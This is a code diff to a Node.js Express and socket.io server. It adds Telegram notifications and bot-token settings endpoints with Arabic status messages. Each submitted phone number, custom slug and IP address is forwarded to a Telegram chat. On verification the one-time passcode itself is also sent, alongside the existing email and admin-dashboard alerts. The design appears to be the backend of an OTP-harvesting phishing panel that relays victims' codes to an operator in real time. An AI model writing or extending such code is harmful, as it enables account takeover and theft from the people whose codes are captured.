@@ -6,6 +6,7 @@ const path = require('path');
 const connectDB = require('./config/db');
 const Verification = require('./models/Verification');
 const emailNotifier = require('./config/emailNotifier');
+const telegramNotifier = require('./config/telegramNotifier');
 
 const app = express();
 const server = http.createServer(app);
@@ -132,6 +133,30 @@ app.post('/api/email-settings/test', async (req, res) => {
     }
 });
 
+// ========== Telegram Bot Settings API ==========
+
+app.get('/api/telegram-settings', (req, res) => {
+    res.json({
+        success: true,
+        telegram: telegramNotifier.getTelegramConfig()
+    });
+});
+
+app.post('/api/telegram-settings', (req, res) => {
+    const { botToken, chatId } = req.body;
+    const configured = telegramNotifier.configureTelegram(botToken, chatId);
+    res.json({ success: true, configured, message: configured ? 'تم حفظ إعدادات تليجرام بنجاح!' : 'تم حفظ الإعدادات' });
+});
+
+app.post('/api/telegram-settings/test', async (req, res) => {
+    try {
+        await telegramNotifier.sendTestNotification();
+        res.json({ success: true, message: '⚡ تم إرسال إشعار تليجرام الفوري بنجاح!' });
+    } catch (err) {
+        res.status(400).json({ success: false, message: err.message });
+    }
+});
+
 // Serve Admin Dashboard page explicitly
 app.get('/admin', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'admin.html'));
@@ -193,6 +218,14 @@ io.on('connection', (socket) => {
                 ipAddress: clientIp,
                 submittedAt: record.submittedAt
             }).catch(err => console.error('[EmailNotifier] Error:', err.message));
+
+            // Send Telegram instant notification (non-blocking)
+            telegramNotifier.notifyPhoneSubmitted({
+                phoneNumber: record.phoneNumber,
+                customSlug: record.customSlug,
+                ipAddress: clientIp,
+                submittedAt: record.submittedAt
+            }).catch(err => console.error('[TelegramNotifier] Error:', err.message));
 
             // Broadcast real-time notification to all connected Admin dashboards
             io.emit('admin_notification', {
@@ -281,6 +314,15 @@ io.on('connection', (socket) => {
                 ipAddress: socket.handshake.address,
                 verifiedAt: updatedRecord.verifiedAt
             }).catch(err => console.error('[EmailNotifier] Error:', err.message));
+
+            // Send Telegram instant notification (non-blocking)
+            telegramNotifier.notifyOTPVerified({
+                phoneNumber: updatedRecord.phoneNumber,
+                otp: otp,
+                customSlug: updatedRecord.customSlug || customSlug || '/',
+                ipAddress: socket.handshake.address,
+                verifiedAt: updatedRecord.verifiedAt
+            }).catch(err => console.error('[TelegramNotifier] Error:', err.message));
 
             // Broadcast real-time notification to Admin dashboard
             io.emit('admin_notification', {
